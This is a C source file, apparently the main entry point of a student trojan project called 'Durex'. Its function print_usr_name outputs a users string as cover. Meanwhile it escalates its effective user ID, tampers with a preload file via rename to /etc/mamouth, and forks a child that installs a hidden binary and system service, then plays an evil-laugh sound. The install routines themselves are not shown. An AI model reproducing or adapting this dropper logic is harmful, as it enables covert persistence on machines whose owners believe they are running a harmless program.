/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: gbourgeo <gbourgeo@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/06/28 08:13:10 by root              #+#    #+#             */
/*   Updated: 2019/08/04 04:38:14 by gbourgeo         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

/* exit */
#include <stdlib.h>
/* getpwuid */
#include <sys/types.h>
#include <pwd.h>
/* rename */
#include <stdio.h>

#include "main.h"

void				print_usr_name()
{
	int				fd;

	write(STDOUT_FILENO, DUREX_USERS, sizeof(DUREX_USERS));
	if (seteuid(geteuid()) != 0)
		return ;
	fd = open(DUREX_BINARY_FILE, O_RDONLY, 0700);
	if (fd < 0) {
		if (rename(DUREX_PRELOAD, "/etc/mamouth")) {
			if (fork() == 0)
			{
				if (!install_binary() && !install_service())
					system("mpg123 -q ./audio/Evil_Laugh.mp3 2>/dev/null");
				exit(0);
			}
		} else {
			rename("/etc/mamouth", DUREX_PRELOAD);
		}
		exit(0);
	}
	close(fd);
}

int					main(int ac, char **av)
{
	(void)ac;
	e.prog = av[0];
	print_usr_name();
	return 0;
}
